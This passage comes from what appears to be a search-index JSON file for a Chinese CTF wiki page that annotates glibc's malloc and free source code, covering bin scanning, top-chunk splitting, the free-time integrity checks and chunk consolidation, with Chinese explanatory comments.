\u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb ; // \u8fdb\u884cunlink unlink ( av , victim , bck , fwd ); /* Exhaust */ // \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757 // \u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002 else { // \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u63d2\u5165unsorted bin\u4e2d bck = unsorted_chunks ( av ); fwd = bck -> fd ; // \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002 if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; // \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5 if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001 // \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86 set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot ( remainder , remainder_size ); } // \u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u8f6c\u6362\u4e3amem\u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } }","title":"large chunk"},{"location":"pwn/heap/heap_implementation_details/#chunk","text":"\u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684bin\u4e2d\u83b7\u53d6chunk\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002 /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++ idx ; // \u83b7\u53d6\u5bf9\u5e94\u7684bin bin = bin_at ( av , idx ); // \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15 // #define idx2block(i) ((i) >> BINMAPSHIFT) ,BINMAPSHIFT=5 // Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728 // \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5 block = idx2block ( idx ); // \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757 map = av -> binmap [ block ]; // #define idx2bit(i) ((1U << ((i) & ((1U << BINMAPSHIFT) - 1)))) // \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0 bit = idx2bit ( idx ); for (;;) {","title":"\u5bfb\u627e\u8f83\u5927 chunk"},{"location":"pwn/heap/heap_implementation_details/#map","text":"/* Skip rest of block if there are no more set bits in this block. */ // \u5982\u679cbit>map\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757 // \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002 if ( bit > map || bit == 0 ) { do { // \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002 // \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86 if ( ++ block >= BINMAPSIZE ) /* out of bins */ goto use_top ; } while (( map = av -> binmap [ block ]) == 0 ); // \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14 // map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002 bin = bin_at ( av , ( block << BINMAPSHIFT )); bit = 1 ; }","title":"\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 map"},{"location":"pwn/heap/heap_implementation_details/#bin","text":"/* Advance to bin with set bit. There must be one. */ // \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002 // \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684 while (( bit & map ) == 0 ) { bin = next_bin ( bin ); bit <<= 1 ; assert ( bit != 0 ); }","title":"\u627e\u5230\u5408\u9002\u7684 bin"},{"location":"pwn/heap/heap_implementation_details/#chunk_1","text":"/* Inspect the bin. It is likely to be non-empty */ // \u83b7\u53d6\u5bf9\u5e94\u7684bin victim = last ( bin ); /* If a false alarm (empty bin), clear the bit. */ // \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin // \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002 if ( victim == bin ) { av -> binmap [ block ] = map &= ~ bit ; /* Write through */ bin = next_bin ( bin ); bit <<= 1 ; }","title":"\u7b80\u5355\u68c0\u67e5 chunk"},{"location":"pwn/heap/heap_implementation_details/#chunk_2","text":"else { // \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f size = chunksize ( victim ); /* We know the first chunk in this bin is big enough to use. */ assert (( unsigned long ) ( size ) >= ( unsigned long ) ( nb )); // \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb ; /* unlink */ unlink ( av , victim , bck , fwd ); /* Exhaust */ // \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272 else { // \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d bck = unsorted_chunks ( av ); fwd = bck -> fd ; if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks 2\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; /* advertise as last remainder */ // \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder if ( in_smallbin_range ( nb )) av -> last_remainder = remainder ; if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot ( remainder , remainder_size ); } // \u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; }","title":"\u771f\u6b63\u53d6\u51fachunk"},{"location":"pwn/heap/heap_implementation_details/#top-chunk","text":"\u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002 use_top : /* If large enough, split off the chunk bordering the end of memory (held in av->top). Note that this is in accord with the best-fit search rule. In effect, av->top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av->top always exists (i.e., has size >= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av -> top ; size = chunksize ( victim ); // \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if (( unsigned long ) ( size ) >= ( unsigned long ) ( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); av -> top = remainder ; // \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c // top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } // \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if ( have_fastchunks ( av )) { // \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76 malloc_consolidate ( av ); /* restore original bin index */ // \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185 // \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15 // \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5 if ( in_smallbin_range ( nb )) idx = smallbin_index ( nb ); else idx = largebin_index ( nb ); } /* Otherwise, relay to handle system-dependent cases */ // \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002 else { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; }","title":"\u4f7f\u7528 top chunk"},{"location":"pwn/heap/heap_implementation_details/#_libc_calloc","text":"calloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728 libc \u4e2d\u7684\u5305\u88c5\u4e3a _libc_calloc \uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b /* calloc(size_t n_elements, size_t element_size); Returns a pointer to n_elements * element_size bytes, with all locations set to zero. */ void * __libc_calloc ( size_t , size_t );","title":"_libc_calloc"},{"location":"pwn/heap/heap_implementation_details/#sysmalloc","text":"\u6709\u65f6\u95f4\u7684\u65f6\u5019\u518d\u5206\u6790\u3002","title":"sysmalloc"},{"location":"pwn/heap/heap_implementation_details/#_10","text":"","title":"\u91ca\u653e\u5185\u5b58\u5757"},{"location":"pwn/heap/heap_implementation_details/#__libc_free","text":"\u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b void __libc_free ( void * mem ) { mstate ar_ptr ; mchunkptr p ; /* chunk corresponding to mem */ // \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook void ( * hook )( void * , const void * ) = atomic_forced_read ( __free_hook ); if ( __builtin_expect ( hook != NULL , 0 )) { ( * hook )( mem , RETURN_ADDRESS ( 0 )); return ; } // free NULL\u6ca1\u6709\u4f5c\u7528 if ( mem == 0 ) /* free(0) has no effect */ return ; // \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001 p = mem2chunk ( mem ); // \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684 if ( chunk_is_mmapped ( p )) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if ( ! mp_ . no_dyn_threshold && chunksize_nomask ( p ) > mp_ . mmap_threshold && chunksize_nomask ( p ) <= DEFAULT_MMAP_THRESHOLD_MAX && ! DUMPED_MAIN_ARENA_CHUNK ( p )) { mp_ . mmap_threshold = chunksize ( p ); mp_ . trim_threshold = 2 * mp_ . mmap_threshold ; LIBC_PROBE ( memory_mallopt_free_dyn_thresholds , 2 , mp_ . mmap_threshold , mp_ . trim_threshold ); } munmap_chunk ( p ); return ; } // \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488 ar_ptr = arena_for_chunk ( p ); // \u6267\u884c\u91ca\u653e _int_free ( ar_ptr , p , 0 ); }","title":"__libc_free"},{"location":"pwn/heap/heap_implementation_details/#_int_free","text":"\u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f static void _int_free ( mstate av , mchunkptr p , int have_lock ) { INTERNAL_SIZE_T size ; /* its size */ mfastbinptr * fb ; /* associated fastbin */ mchunkptr nextchunk ; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize ; /* its size */ int nextinuse ; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize ; /* size of previous contiguous chunk */ mchunkptr bck ; /* misc temp for linking */ mchunkptr fwd ; /* misc temp for linking */ const char * errstr = NULL ; int locked = 0 ; size = chunksize ( p );","title":"_int_free"},{"location":"pwn/heap/heap_implementation_details/#_11","text":"/* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ // \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f // \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3 if ( __builtin_expect (( uintptr_t ) p > ( uintptr_t ) - size , 0 ) || __builtin_expect ( misaligned_chunk ( p ), 0 )) { errstr = \"free(): invalid pointer\" ; errout : if ( ! have_lock && locked ) __libc_lock_unlock ( av -> mutex ); malloc_printerr ( check_action , errstr , chunk2mem ( p ), av ); return ; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d if ( __glibc_unlikely ( size < MINSIZE || ! aligned_OK ( size ))) { errstr = \"free(): invalid size\" ; goto errout ; } // \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_inuse_chunk ( av , p ); \u5176\u4e2d /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long) (m) &MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK)","title":"\u7b80\u5355\u7684\u68c0\u67e5"},{"location":"pwn/heap/heap_implementation_details/#fast-bin_1","text":"\u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230 fastbin \u5934\u90e8 \uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684 \u7b2c\u4e00\u4e2a free chunk \u3002 /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if (( unsigned long ) ( size ) <= ( unsigned long ) ( get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ //\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c // \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165 && ( chunk_at_offset ( p , size ) != av -> top ) #endif ) { // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14 // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k // \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002 if ( __builtin_expect ( chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem , 0 )) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if ( have_lock || ({ assert ( locked == 0 ); __libc_lock_lock ( av -> mutex ); locked = 1 ; chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ || chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem ; })) { errstr = \"free(): invalid next size (fast)\" ; goto errout ; } if ( ! have_lock ) { __libc_lock_unlock ( av -> mutex ); locked = 0 ; } } // \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ ); // \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d set_fastchunks ( av ); // \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15 unsigned int idx = fastbin_index ( size ); // \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002 fb = & fastbin ( av , idx ); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d mchunkptr old = * fb , old2 ; unsigned int old_idx = ~ 0u ; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // so we can not double free one fastbin chunk // \u9632\u6b62\u5bf9 fast bin double free if ( __builtin_expect ( old == p , 0 )) { errstr = \"double free or corruption (fasttop)\" ; goto errout ; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if ( have_lock && old != NULL ) old_idx = fastbin_index ( chunksize ( old )); p -> fd = old2 = old ; } while (( old = catomic_compare_and_exchange_val_rel ( fb , p , old2 )) != old2 ); // \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c if ( have_lock && old != NULL && __builtin_expect ( old_idx != idx , 0 )) { errstr = \"invalid fastbin entry (free)\" ; goto errout ; } }","title":"fast bin"},{"location":"pwn/heap/heap_implementation_details/#mmap-chunk","text":"\u53ea\u6709\u4e0d\u662f fast bin \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1unlink \u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514dheap\u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a \u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757 \u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757 \u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002 \u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002 /* Consolidate other non-mmapped chunks as they arrive. */ else if ( ! chunk_is_mmapped ( p )) { if ( ! have_lock ) { __libc_lock_lock ( av -> mutex ); locked = 1 ; } nextchunk = chunk_at_offset ( p , size );","title":"\u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk"},{"location":"pwn/heap/heap_implementation_details/#_12","text":"/* Lightweight tests: check whether the block is already the top block. */ // \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk if ( __glibc_unlikely ( p == av -> top )) { errstr = \"double free or corruption (top)\" ; goto errout ; } // \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c /* Or whether the next chunk is beyond the boundaries of the arena. */ if ( __builtin_expect ( contiguous ( av ) && ( char * ) nextchunk >= (( char * ) av -> top + chunksize ( av -> top )), 0 )) { errstr = \"double free or corruption (out)\" ; goto errout ; } // \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free /* Or whether the block is actually not marked used. */ if ( __glibc_unlikely ( ! prev_inuse ( nextchunk ))) { errstr = \"double free or corruption (!prev)\" ; goto errout ; } // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f nextsize = chunksize ( nextchunk ); // next chunk size valid check // \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005 // nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58 if ( __builtin_expect ( chunksize_nomask ( nextchunk ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( nextsize >= av -> system_mem , 0 )) { errstr = \"free(): invalid next size (normal)\" ; goto errout ; }","title":"\u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b"},{"location":"pwn/heap/heap_implementation_details/#_13","text":"//\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ );","title":"\u91ca\u653e\u586b\u5145"},{"location":"pwn/heap/heap_implementation_details/#-chunk","text":"/* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); }","title":"\u540e\u5411\u5408\u5e76-\u5408\u5e76\u4f4e\u5730\u5740 chunk"},{"location":"pwn/heap/heap_implementation_details/#top-chunk-chunk","text":"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \u540e\uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230unsorted bin\u4e2d\u3002 // \u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk if ( nextchunk != av -> top ) { /* get and clear inuse bit */ // \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001 nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); // \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002 /* consolidate forward */ if ( ! nextinuse ) { unlink ( av , nextchunk , bck , fwd ); size += nextsize ; } else clear_inuse_bit_at_offset ( nextchunk , 0 ); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8 bck = unsorted_chunks ( av ); fwd = bck -> fd ; // \u7b80\u5355\u7684\u68c0\u67e5 if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"free(): corrupted unsorted chunks\" ; goto errout ; } p -> fd = fwd ; p -> bk = bck ; // \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002 if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } bck -> fd = p ; fwd -> bk = p ; set_head ( p , size | PREV_INUSE ); set_foot ( p , size ); check_free_chunk ( av , p ); }","title":"\u4e0b\u4e00\u5757\u4e0d\u662ftop 